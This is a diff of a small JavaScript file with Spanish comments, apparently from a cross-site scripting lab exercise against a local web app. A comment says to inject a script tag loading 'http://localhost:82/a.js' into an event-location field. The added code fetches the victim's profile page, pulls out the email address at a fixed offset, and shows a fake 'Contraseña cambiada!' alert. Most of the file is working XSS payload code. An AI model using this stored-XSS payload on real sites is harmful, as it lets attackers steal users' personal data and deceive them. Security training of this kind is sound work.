@@ -1,5 +1,22 @@
 // Donde pone "introduce lugar del evento" hay que poner <script src="http://localhost:82/a.js"></script>
-
+// Donde pone "introduce lugar del evento" hay que poner <script src="http://localhost:82/a.js"></script>
+fetch('http://localhost:81/editarMiPerfil.php', {
+    method: 'GET',
+    headers: {
+    },
+})
+.then(response => response.text())
+.then(text => buscarCorreo(text))
+function buscarCorreo(texto){
+  var p = texto.indexOf('@')
+  var correo = '';
+  var i = 636
+  while (texto[i]!=' '){
+    correo = correo +texto[i]
+    i = i+1
+  }
+  return correo
+}
 alert("Contraseña cambiada!")
 
 // Solo dios sabe lo que hace esa regex, asi que en vez de
